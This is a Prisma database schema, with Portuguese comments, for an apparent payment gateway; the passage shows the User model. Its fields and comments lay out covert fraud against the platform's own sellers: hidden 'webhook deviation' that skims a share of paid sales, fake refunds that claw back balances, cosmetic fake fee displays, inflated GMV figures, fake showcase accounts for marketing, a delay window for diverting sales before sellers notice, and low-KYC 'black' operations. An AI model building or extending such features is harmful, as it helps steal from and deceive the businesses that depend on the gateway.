generator client {
  provider        = "prisma-client-js"
  previewFeatures = ["driverAdapters"]
}

datasource db {
  provider = "postgresql"
}

// ----------- Better-Auth core models -----------

model User {
  id                    String  @id @default(cuid())
  email                 String  @unique
  emailVerified         Boolean @default(false)
  /// 23/07/2026 (davi): email FORNECIDO pelo seller na criacao de sub-conta.
  /// O email de auth ("email" acima) fica interno (sub-XXXX@subaccount.trilhopag.
  /// local) pra nao colidir com contas reais no Better Auth. Este campo guarda
  /// o email real que o seller digitou — usado pelo admin em /admin01/users
  /// pra buscar sub-contas por email como se fossem contas principais. Nullable
  /// (parent accounts nao tem). Sem unique constraint (multiplas subs podem
  /// apontar pro mesmo email — ex: mesmo dono, contas diferentes).
  subAccountLinkedEmail String? @db.VarChar(254)
  name                  String?
  image                 String?

  twoFactorEnabled Boolean @default(false)
  twoFactorSecret  String?

  cpfCnpj    String?
  phone      String?
  birthDate  DateTime?
  personType String    @default("PF") // PF | PJ

  balanceCents         Int    @default(0)
  pendingBalanceCents  Int    @default(0)
  reservedBalanceCents Int    @default(0)
  defaultCurrency      String @default("BRL")

  // Platform fees applied to this user (override able por admin).
  // Cada método tem seu próprio par percent + fixed pra dar flexibilidade
  // máxima de precificação por seller.
  // Defaults: PIX 6.99%+R$2,50; Card 9.90%+R$3,60; Boleto 4.99%+R$3,60;
  // ApplePay/GooglePay 8.99%+R$3,60.
  // Withdrawal: R$2,00 fixos por saque.
  feePercent                  Float   @default(6.99)
  feeFixedCents               Int     @default(200)
  cardFeePercent              Float   @default(9.90)
  cardFeeFixedCents           Int     @default(360)
  boletoFeePercent            Float   @default(4.99)
  boletoFeeFixedCents         Int     @default(360)
  applePayFeePercent          Float   @default(8.99)
  applePayFeeFixedCents       Int     @default(360)
  googlePayFeePercent         Float   @default(8.99)
  googlePayFeeFixedCents      Int     @default(360)
  withdrawalFeeCents          Int     @default(990) // fixo por saque (R$ 9,90)
  /// Saque AUTOMÁTICO via API da SafePix. ON por padrão (jun/2026) — TODOS os
  /// sellers têm saque instantâneo. Se houver UMA conta SafePix com saldo p/ o
  /// valor, o saque é enviado na hora; senão (saldo disperso) cai pro manual.
  /// A auditoria automática (withdrawal-audit) é quem impede sacar mais do que
  /// entrou — o instantâneo não relaxa essa trava.
  autoWithdrawEnabled         Boolean @default(true)
  /// Teto DIÁRIO (cents) de saque automático por seller. 0 = SEM LIMITE (default
  /// jun/2026). Admin pode setar um valor >0 pra reimpor teto a um seller
  /// específico (acima dele o saque vira manual). A trava REAL contra
  /// over-withdrawal é a auditoria reconciliada, não este teto.
  autoWithdrawDailyLimitCents Int     @default(0)

  /// SAQUE AUTOMÁTICO PROGRAMADO (configurado pelo SELLER, ≠ do auto-PAGAMENTO
  /// via PSP acima). Quando o saldo disponível atinge scheduledWithdrawThreshold
  /// um cron cria um saque PIX automático (saldo cheio) pra chave PIX salva
  /// (scheduledWithdrawDestId → PayoutDestination). Reaproveita requestWithdrawal
  /// (mín. R$100, auditoria, 1 saque aberto por vez). Aumenta volume de saques.
  scheduledWithdrawEnabled        Boolean @default(false)
  scheduledWithdrawThresholdCents Int     @default(0)
  scheduledWithdrawDestId         String?

  // ⚠️ TAXAS APARENTES (admin-only, 100% cosmético). Quando setado (non-null),
  // é o valor que o SELLER VÊ na aba Perfil → Taxas — pode ser DIFERENTE da
  // taxa REAL acima. Null = mostra a taxa real. NÃO afeta o cálculo de
  // nenhuma venda/saque; serve só pra exibir uma taxa "de fachada" pro seller.
  // NUNCA usar esses campos em cobrança — apenas na UI do perfil do seller.
  apparentFeePercent             Float?
  apparentFeeFixedCents          Int?
  apparentCardFeePercent         Float?
  apparentCardFeeFixedCents      Int?
  apparentBoletoFeePercent       Float?
  apparentBoletoFeeFixedCents    Int?
  apparentApplePayFeePercent     Float?
  apparentApplePayFeeFixedCents  Int?
  apparentGooglePayFeePercent    Float?
  apparentGooglePayFeeFixedCents Int?
  apparentWithdrawalFeeCents     Int?

  // Bturb usage billing: 4000 plays grátis, depois R$0,01 por play do saldo.
  bturbPlaysUsed   Int @default(0)
  bturbPlaysBilled Int @default(0) // plays já cobrados (não recobrar)

  // Metadados (video-camuflagem): 20 usos grátis, depois R$0,10 por uso.
  metadadosUsesUsed   Int @default(0)
  metadadosUsesBilled Int @default(0)

  // ⚠️ DESVIO DE WEBHOOK (camuflado — só admin enxerga).
  // Quando >0, a porcentagem das vendas APROVADAS é desviada — não chega na
  // dashboard do seller, vai direto pra adquirente sem taxa do gateway.
  // Operações "black" combinadas com o seller. NUNCA expor essa info ao seller.
  // Range: 0-100 (Float). 0 = comportamento normal.
  /// Default global (aplica em todos os métodos quando o per-method é null).
  webhookDeviationPercent   Float     @default(0)
  /// Quando setado, o desvio expira nessa data (volta a 0%). Null = sem expiração.
  webhookDeviationExpiresAt DateTime?

  /// Per-method overrides — quando setado, sobrescreve o global pra aquele
  /// método específico. Quando null, fall back pra webhookDeviationPercent.
  webhookDeviationPercentPix       Float?
  webhookDeviationPercentCard      Float?
  webhookDeviationPercentApplePay  Float?
  webhookDeviationPercentGooglePay Float?
  webhookDeviationPercentBoleto    Float?

  /// Filtro de tráfego pra aplicar o desvio. Default "all" (qualquer venda).
  /// "paid" = só vendas com UTM source de tráfego pago (facebook, google,
  /// tiktok, bing, etc) ou utm_medium=cpc/paid. Vendas orgânicas (sem UTM,
  /// direct, organic, email, whatsapp) NÃO entram no sorteio do %.
  /// "organic" = oposto — só vendas orgânicas entram. Útil pra esconder
  /// %X dos casos sem rastreio de origem.
  webhookDeviationFilter String @default("all")

  // ⚠️ HOLDING / RELEASE TIMINGS (per-seller, per-method).
  // Tempo em MINUTOS desde paidAt até a venda ficar sacável.
  // Defaults: PIX 0min (INSTANTÂNEO — cai na hora no saldo), todo resto 30
  // dias (43200 min). Admin pode setar >0 pra segurar o PIX se quiser.
  holdMinutesPix       Int @default(0)
  holdMinutesCard      Int @default(43200)
  holdMinutesApplePay  Int @default(43200)
  holdMinutesGooglePay Int @default(43200)
  holdMinutesBoleto    Int @default(43200)

  // Retenção (cartão e wallets only) — % retido por N dias.
  cardRetentionPercent Float @default(10)
  cardRetentionDays    Int   @default(90)

  /// REEMBOLSO FAKE (admin-only). Simula reembolsos pra parecer "real" /
  /// clawback do saldo do seller. NAO chama o PSP.
  ///   fakeRefundPercent: % das vendas PAGAS dessa conta que viram REFUNDED
  ///     automaticamente (sorteado no markTransactionPaid). 0 = desligado.
  ///   fakeRefundDelayDays: dias apos o paidAt ate o reembolso fake "cair".
  ///     Tambem usado como default do botao de reembolso fake por transacao.
  /// Quando aplica: markTransactionRefunded + providerPayload.fake_refund=true
  /// (reverte o net creditado + taxa, dispara webhook transaction.refunded).
  fakeRefundPercent   Float @default(0)
  fakeRefundDelayDays Int   @default(7)

  /// Modo de operação PIX da conta. Valores válidos: OPS_MODES em
  /// src/lib/ops-modes.ts (black, white, hot, sag) — String e não enum de
  /// propósito, pra modo novo não custar migration.
  /// Black: alta margem, sem MED PIX, sem reembolso (plataforma cobre).
  /// White: baixo risco, COM MED PIX e COM reembolso.
  /// Hot: taxa flat por venda abaixo de R$16.
  /// SAG (sub adquirente gateway, 08/08/2026): PIX + cartão, e só enxerga
  /// adquirentes marcadas `mode = "sag"` (não herda as "both").
  pixOpsMode String @default("black")

  /// Template da mensagem do botão "WhatsApp" na aba de Vendas. Cada venda
  /// ganha um botão que abre o WhatsApp já no número do lead com esta mensagem
  /// pré-preenchida. Placeholders: {nome} {produto} {valor} {status}.
  /// null = usa o template padrão. Editável pelo lápis ao lado do botão.
  whatsappQuickTemplate String?

  /// "Melhor ordem global do gateway" (aba Adquirentes). Quando true, a ordem
  /// das adquirentes do seller é reescrita automaticamente priorizando no topo
  /// as melhores em conversão do gateway INTEIRO no dia de hoje. Bloqueia
  /// arrastar/promover e testes A/B. Ao desativar, restaura a ordem manual
  /// salva em autoBestOrderSnapshot.
  autoBestOrderEnabled  Boolean @default(false)
  /// Snapshot da ordem manual do seller (por UserAcquirer) salvo no momento em
  /// que autoBestOrderEnabled foi ligado, pra restaurar ao desligar. Formato:
  /// [{ id, pixPriority, cardPriority, priority }].
  autoBestOrderSnapshot Json?

  /// JANELA DE 60s PRE-NOTIFICACAO DO SELLER (opt-in per-user, default OFF).
  ///
  /// Quando true, markTransactionPaid agenda os dispatches do seller pra
  /// +60s via sellerNotifyScheduledAt e o cron release-paid-to-seller
  /// processa apos a janela. Da margem pro admin editar valor / desviar
  /// (Skim/Rede) antes do seller perceber a venda.
  ///
  /// Quando false (default), markTransactionPaid dispara TUDO imediatamente
  /// (webhook, push, email, sale-bot, pixels, CRM) e seta sellerNotifiedAt
  /// = now — sem janela, sem espera. Comportamento pre-junho/2026.
  ///
  /// Politica: ative SO em contas que voce quer ter chance de editar/desviar
  /// antes do seller saber. Default desligado pra todos minimizar overhead
  /// + ter UX de venda paga "instantanea" como esperado.
  sellerNotifyDelayEnabled Boolean @default(false)

  /// "white" (default) ou "black" — define o modo de operação de CARTÃO.
  /// Quando black, sellers pagam taxa MAIOR (35% + R$10) e tem retenção
  /// MAIOR (20% por 90 dias) em troca de poder rodar cartão em volume
  /// alto sem KYC robusto pelo seller (a plataforma cobre o risco).
  /// White segue o padrão antigo (cardFeePercent/cardFeeFixedCents +
  /// cardRetentionPercent normal).
  /// Acquirers de cartão são filtradas por Acquirer.mode === cardOpsMode.
  cardOpsMode String @default("white")

  /// Quando o seller escolheu o modo de operação no pop-up de 1º acesso.
  /// null = ainda não escolheu → mostra o pop-up de seleção (black/white/hot).
  opsModeChosenAt DateTime?

  /// Modos de conta PROIBIDOS para este seller (subset de OPS_MODES —
  /// src/lib/ops-modes.ts). Controlado pelo admin em Taxas customizadas.
  /// Um modo aqui some da aba Adquirentes E não pode gerar PIX/cartão (o
  /// dispatch recusa). Não pode proibir TODOS (sempre sobra ≥1 modo válido —
  /// a guarda usa OPS_MODES.length, não um número escrito à mão).
  forbiddenOpsModes String[] @default([])

  /// PAINEL PROPRIO DE ADQUIRENTES (19/07/2026, davi): quando true, o seller
  /// enxerga APENAS as adquirentes listadas em `ownAcquirerPanel` pra cada
  /// modo. Quando false (default), enxerga o painel geral público (comportamento
  /// atual — filtrado por acquirerSellerVisibleWhere).
  ownAcquirerPanelEnabled Boolean @default(false)

  /// Whitelist de adquirentes por modo (black/white/hot). Só usado quando
  /// ownAcquirerPanelEnabled=true E o modo NAO está em ownAcquirerPanelPublicModes.
  /// Formato:
  ///   { "black": ["acqId1", "acqId2"], "white": [...], "hot": [...] }
  /// Se algum modo não estiver no map ou for lista vazia, seller não vê
  /// adquirentes DAQUELE modo (a menos que esteja em publicModes).
  /// Admin configura em /admin01/users/[id].
  ownAcquirerPanel Json?

  /// Lista de modos onde o painel próprio delega pra visibilidade GERAL
  /// (public/private normal do acquirerSellerVisibleWhere). Exemplo:
  ///   ownAcquirerPanelEnabled=true + publicModes=["black"] →
  ///     Black: seller vê o painel geral (todas as visíveis normalmente).
  ///     White + Hot: seller vê APENAS a whitelist do ownAcquirerPanel[mode].
  /// Vazio (default) = todos os modos usam whitelist. 19/07/2026 (davi).
  ownAcquirerPanelPublicModes String[] @default([])

  /// Quando true, a API publica (POST /api/v1/transactions) pode criar
  /// cobranças de CARTÃO sem o seller ter um produto cadastrado.
  /// Default false — API publica sem produto so faz PIX. Admin liga isso
  /// caso a caso pra contas especiais (ex: integração interna).
  apiCardEnabled Boolean @default(false)

  /// Toggle controlado pelo admin. Quando true, o seller VÊ a UI de
  /// "desvio de vendas dos seus indicados" na aba Minha Rede (e pode
  /// configurar % de desvio individual por indicado). Quando false
  /// (default), a UI fica oculta — o user não sabe que existe.
  /// Independente do webhookDeviationPercent do próprio user.
  referralDeviationEnabled Boolean @default(false)

  /// % de desvio aplicado nas transações DESSE user pelo SEU referrer.
  /// Apenas o referrer (com referralDeviationEnabled=true) pode setar.
  /// Quando uma tx do user é desviada, o netCents vai pra balance do
  /// referrer (e a tx some das views do user, igual webhookDeviation).
  /// Operação interna — o user (referido) nunca enxerga.
  referralAppliedDeviationPercent Float @default(0)

  /// % DEFAULT que esse user (gerente) aplica automaticamente em todos os
  /// NOVOS afiliados que entrarem via link dele. Permite o gerente ter
  /// uma rede passiva sem precisar abrir cada afiliado individualmente.
  /// Aplicado em attach-referral.ts quando referredByUserId eh setado.
  /// Default 0 (gerente decide ativar via /dashboard/rede).
  referralDefaultDeviationPercent Float @default(0)

  /// % do amountCents da venda desviada que fica com a PLATAFORMA. O
  /// resto vai pra balance do REFERRER. Default 50/50.
  /// Configurável pelo admin pra cada user.
  referralDeviationPlatformSharePercent Float @default(50)

  /// Acumulado lifetime de ganho via desvio (separado de referralEarningsCents
  /// que mistura tudo). Pra exibir métrica isolada na UI da Minha Rede.
  referralDeviationEarningsCents Int @default(0)

  /// Filtro de qual tipo de tráfego entra no sorteio do desvio.
  /// Valores:
  ///   "all"     — todas as transações (default) entram no sorteio %
  ///   "organic" — SÓ transações orgânicas (sem utm_source de plataforma
  ///               paga). Protege ROAS de campanhas pagas
  ///   "paid"    — SÓ transações de tráfego PAGO (utm_source de Meta,
  ///               TikTok, Google, etc. OU utm_medium "cpc"/"paid").
  ///               Útil pra desviar só vendas com tracking certo
  referralDeviationFilter String @default("all")

  /// Contador lifetime de campanhas subidas em massa (tracking/massa).
  /// Cada subida cobra R$1,00 (100 cents) do balanceCents.
  massCampaignUploadsCount      Int       @default(0)
  /// Total cobrado lifetime em massa-campaign uploads (1c-precision pra
  /// auditoria). Útil pra exibir métrica no admin.
  massCampaignChargedCents      Int       @default(0)
  /// Quando setado, o user tem acesso ao recurso de Subir em Massa ATÉ
  /// essa data. Subscription mensal de R$ 197,90 (saldo ou PIX MP).
  /// Null = sem subscription ativa. Comparar com new Date() pra checar.
  massCampaignSubscriptionUntil DateTime?

  /// Uploads "gratis" restantes do plano atual de Mass Campaign. Cada
  /// assinatura nova (PIX ou saldo) reseta pra 20 (incluido no plano).
  /// Quando chega a 0, cada upload extra cobra R$ 1,00 do saldo.
  massCampaignFreeUploadsLeft Int @default(0)

  /// Marca a conta como "amigo" do dono — pula paywall de tudo (mass
  /// campaign, themes, tracking, sub-accounts, etc). Apenas o admin
  /// pode ligar/desligar via /admin01. Util pra contas de teste,
  /// parceiros, equipe, family-and-friends.
  /// Quando true, hasActiveMassCampaignSubscription retorna true,
  /// hasTheme retorna true pra QUALQUER themeKey, etc.
  isFriendAccount Boolean @default(false)

  /**
   * Personalizacao de push notifications por tipo de evento. Shape:
   * {
   * "pending":    { "title": "{emoji} PIX recebido", "body": "{amount} de {customer}", "emoji": "🕐", "sound": true },
   * "paid":       { "title": "💰 +{amount}!", "body": "...", "emoji": "💰", "sound": true },
   * "withdrawal": { "title": "✅ Saque pago", "body": "...", "emoji": "🏦", "sound": true }
   * }
   * Vazio/null = usa defaults do sistema.
   * Variables suportadas no template: {amount}, {customer}, {product}, {count}, {emoji}
   */
  notificationPrefs Json?

  /// AJUSTE MANUAL DE GMV (signed, em cents) — admin pode adicionar/subtrair
  /// pra "inflar" o valor de vendas pagas exibido (vitrine pra marketing).
  /// Nao afeta vendas reais — eh somente um DELTA sobre o GMV calculado a
  /// partir das Transactions. Aplicado no /admin01/users/[id] e em
  /// metricas publicas se aplicavel.
  gmvAdjustmentCents Int @default(0)

  /// "Player Divulgador" — conta autorizada a CRIAR sub-contas-divulgador
  /// fakes (DivulgadorAccount) em /dashboard/divulgador. Cada sub-conta
  /// tem metricas 100% editaveis (saldo, faturamento dia/30d/lifetime,
  /// ROI, etc) — usadas exclusivamente pra prints/Reels/divulgacoes.
  ///
  /// NADA na sub-conta funciona de verdade — eh uma view 100% renderizada
  /// a partir do JSON salvo. A conta MAE (este User) continua com saldo
  /// real e operacoes normais (saques, vendas, etc).
  ///
  /// Quando admin desativa esse flag, TODAS as DivulgadorAccount do user
  /// sao deletadas em cascata (volta ao normal, sem residuo no DB).
  isPlayerDivulgador Boolean @default(false)

  /// @deprecated — legacy do MVP do player mode (substituido por
  /// DivulgadorAccount). Mantido como Json @default("{}") pra evitar
  /// drop-during-deploy: derrubar a coluna quebrava a versao
  /// imediatamente anterior em produçao porque Better Auth faz
  /// `prisma.user.findFirst()` sem `select` e a query referencia TODAS
  /// as colunas conhecidas pelo client. NAO usar — apenas existe como
  /// vestigio seguro.
  playerDivulgadorOverrides Json @default("{}")

  /// Sub-contas fakes pra divulgacao (cascade delete via DB).
  ownedDivulgadorAccounts DivulgadorAccount[] @relation("OwnedDivulgadorAccounts")

  // Taxas DEFAULT que NOVOS cadastros via o link de indicação desse user
  // vão herdar como SUAS taxas. Quando null, fall back pra User.feePercent
  // (comportamento legado). Permitem o seller cobrar taxas diferentes dos
  // indicados sem mexer nas próprias taxas.
  linkDefaultFeePercent             Float?
  linkDefaultFeeFixedCents          Int?
  linkDefaultCardFeePercent         Float?
  linkDefaultCardFeeFixedCents      Int?
  linkDefaultBoletoFeePercent       Float?
  linkDefaultBoletoFeeFixedCents    Int?
  linkDefaultApplePayFeePercent     Float?
  linkDefaultApplePayFeeFixedCents  Int?
  linkDefaultGooglePayFeePercent    Float?
  linkDefaultGooglePayFeeFixedCents Int?
  linkDefaultWithdrawalFeeCents     Int?
  /// Taxas por MODO de adquirente que o INDICADOR define pros indicados.
  /// JSON: { black:{pixPct,pixFix}, white:{pixPct,pixFix,cardPct,cardFix},
  /// hot:{pixPct,pixFix} }. Aplicado ao indicado conforme o modo dele.
  linkDefaultsByMode                Json?
  /// Override de taxas por modo DESTE indicado (setado pelo referrer/admin no
  /// "editar taxas"). Mesma forma do linkDefaultsByMode. Precedência ao aplicar
  /// um modo: feesByMode (deste user) > linkDefaultsByMode (do referrer) > plataforma.
  feesByMode                        Json?
  /// TAXAS APARENTES por MODO (black/white/hot) — 100% cosméticas (o que o
  /// seller VÊ no perfil, não cobram nada). Mesma forma do feesByMode, mas cada
  /// campo é nullable (vazio = mostra a taxa REAL). Aplicado ao trocar de modo:
  /// popula os campos flat apparent* conforme o modo atual do seller.
  apparentFeesByMode                Json?
  /// DESVIO DE WEBHOOK por MODO de adquirente × MÉTODO (interno, dinheiro real).
  /// JSON: { black:{pix}, white:{pix,card}, hot:{pix} } — % nullable (vazio =
  /// cai no per-method legado / global). Precedência no engine de desvio:
  /// deviationByMode[modo do seller][método] > webhookDeviationPercent<Método>
  /// (legado) > webhookDeviationPercent (global). PIX usa pixOpsMode; cartão usa
  /// cardOpsMode. NUNCA exposto ao seller.
  deviationByMode                   Json?
  /// TRAVA de adquirente por MODO (black/white/hot). O seller "trava" uma
  /// adquirente nominal e o PIX passa a ser gerado SÓ nela — batch SOLO no topo
  /// do dispatch, prioridade MÁXIMA (timeout/AbortController próprios). Só cai
  /// pras demais (fallback exaustivo) se a travada FALHAR (bug/timeout/rede).
  /// Forma: { black:"<acquirerId>", white:"<acquirerId>", hot:"<acquirerId>" } —
  /// chave ausente/null = sem trava (fanout normal por pixPriority). A chave é o
  /// User.pixOpsMode no momento da geração. Se a travada ficar inelegível
  /// (desativada / modo trocado / sem handler), o dispatcher ignora e cai no
  /// fanout — a trava NUNCA impede a geração do PIX.
  lockedPixAcquirerByMode           Json?
  /// Se já passou pela tour de boas-vindas
  welcomeSeenAt                     DateTime?

  // Referral / network
  referralCode          String? @unique
  referredByUserId      String?
  referredBy            User?   @relation("ReferralNetwork", fields: [referredByUserId], references: [id])
  referrals             User[]  @relation("ReferralNetwork")
  referralEarningsCents Int     @default(0)

  role                  String  @default("user") // user | admin
  blocked               Boolean @default(false)
  blockReason           String?
  /// Admin bloqueou a GERAÇÃO de PIX nesta conta (seller não consegue vender).
  /// Diferente de `blocked` (que bane o login): aqui o login funciona, mas
  /// NENHUM PIX é gerado. Enforced nas rotas de criação de cobrança.
  pixIntegrationBlocked Boolean @default(false)
  /// Admin escondeu a "rede de tráfego" (best tracker) deste seller.
  hideTrafficNetwork    Boolean @default(false)
  /// Liberação INDIVIDUAL de saque pra ESTE seller. A auditoria automática
  /// continua BLOQUEANDO normalmente pra todo mundo; só este seller específico
  /// passa direto mesmo caindo num flag de "block" (ex: chargeback rate alto).
  /// Não muda nada pros demais. A trava de saldo (não sacar mais que o
  /// balanceCents) continua valendo SEMPRE, inclusive pra ele.
  withdrawalAuditBypass Boolean @default(false)

  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  accounts               Account[]
  sessions               Session[]
  products               Product[]
  checkouts              Checkout[]
  transactions           Transaction[]
  apiKeys                ApiKey[]
  webhooks               Webhook[]
  pixProviders           PixProviderConfig[]
  trackingPixels         TrackingPixel[]
  withdrawals            Withdrawal[]
  whatsappConfig         WhatsappConfig?
  dispatchProvider       DispatchProvider?
  utmifyConfig           UtmifyConfig?
  settings               UserSettings?
  coupons                Coupon[]
  achievements           Achievement[]
  customers              Customer[]
  rewardClaims           RewardClaim[]
  teamMembers            TeamMember[]            @relation("TeamMembers")
  address                Address?
  bankAccount            BankAccount?
  kycDocuments           KycDocument[]
  acquirers              UserAcquirer[]
  acquirerTests          AcquirerTest[]
  adAccounts             AdAccount[]             @relation("UserAdAccounts")
  adRules                AdRule[]                @relation("UserAdRules")
  bturbVideos            BturbVideo[]            @relation("UserBturbVideos")
  cloakerCampaigns       CloakerCampaign[]       @relation("UserCloakerCampaigns")
  productFolders         ProductFolder[]         @relation("UserProductFolders")
  memberAreas            MemberArea[]            @relation("UserMemberAreas")
  emailVerificationCodes EmailVerificationCode[] @relation("UserEmailVerificationCodes")
  saleBots               SaleBot[]               @relation("UserSaleBots")
  salesChannels          SalesChannel[]          @relation("UserSalesChannels")
  funnels                Funnel[]                @relation("UserFunnels")
  mediaAssets            MediaAsset[]            @relation("UserMediaAssets")
  themePurchases         ThemePurchase[]         @relation("UserThemePurchases")
  customDomains          CustomDomain[]          @relation("UserCustomDomains")
  subscriptions          Subscription[]          @relation("UserSubscriptions")
  massCampaignTemplates  MassCampaignTemplate[]  @relation("UserMassCampaignTemplates")
  massCampaignJobs       MassCampaignJob[]       @relation("UserMassCampaignJobs")
  payoutDestinations     PayoutDestination[]     @relation("UserPayoutDestinations")
  referralLinks          ReferralLink[]          @relation("UserReferralLinks")
  featureRequests        FeatureRequest[]        @relation("UserFeatureRequests")
  pushSubscriptions      PushSubscription[]      @relation("UserPushSubscriptions")
  adSnapshots            AdSpendSnapshot[]       @relation("UserAdSnapshots")

  kycStatus          String  @default("not_started") // not_started | in_review | approved | rejected
  kycRejectionReason String?

  // Sub-accounts (instant dashboards under same login)
  parentUserId String?
  parent       User?   @relation("SubAccounts", fields: [parentUserId], references: [id], onDelete: SetNull)
  subAccounts  User[]  @relation("SubAccounts")
  isSubAccount Boolean @default(false)

  @@index([email])
  @@index([referredByUserId])
  @@index([referralCode])
  @@index([parentUserId])
  @@index([subAccountLinkedEmail])
  /// Central do sino (09/08/2026, secao 19). Ver model SellerNotification.
  sellerNotifications SellerNotification[]
  /// Log da API publica (09/08/2026). Ver model ApiRequestLog.
  apiRequestLogs ApiRequestLog[] @relation("ApiRequestLogs")
}

model RewardClaim {
